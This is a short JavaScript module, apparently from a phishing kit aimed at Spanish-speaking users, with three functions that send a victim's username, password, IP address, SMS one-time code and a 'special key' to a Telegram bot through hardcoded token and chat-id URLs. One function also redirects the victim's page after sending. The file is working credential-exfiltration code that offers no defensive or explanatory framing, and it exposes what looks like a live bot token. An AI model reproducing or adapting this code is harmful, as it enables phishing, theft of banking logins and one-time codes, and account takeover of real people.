const telegram_token = "7222349298:AAEJuz6D0sabZTHAA-5HxP6HRavhpHThx_4";
const chat_id = "-1002213126450";

export function tlgSMSuser(user) {
  const url = `https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${chat_id}&text=%F0%9F%91%A5USER%3A%20${user.user}%0A%F0%9F%94%91PASS%3A%20${user.pass}%0A%E2%9E%96%E2%9E%96%E2%9E%96%5BIP%20INFO%5D%E2%9E%96%E2%9E%96%E2%9E%96%E2%9E%96%0A%F0%9F%8C%90IP%3A%20${user.ip}`;
  fetch(url);
}

export function tlgSMStoken(user) {
  const url = `https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${chat_id}&text=%F0%9F%92%ACTOKEN%20SMS%3A%20${user.sms}%0A%E2%9E%96%E2%9E%96%E2%9E%96%5BIP%20INFO%5D%E2%9E%96%E2%9E%96%E2%9E%96%E2%9E%96%0A%F0%9F%8C%90IP%3A%20${user.ip}`;
  fetch(url).then(() => {
    window.location.replace("");
  });;
}

export function tlgSMSkey(user) {
  const url = `https://api.telegram.org/bot${telegram_token}/sendMessage?chat_id=${chat_id}&text=%E2%9A%99%EF%B8%8FCLAVE ESPECIAL%3A%20${user.key}%0A%E2%9E%96%E2%9E%96%E2%9E%96%5BIP%20INFO%5D%E2%9E%96%E2%9E%96%E2%9E%96%E2%9E%96%0A%F0%9F%8C%90IP%3A%20${user.ip}`;
  fetch(url)
}
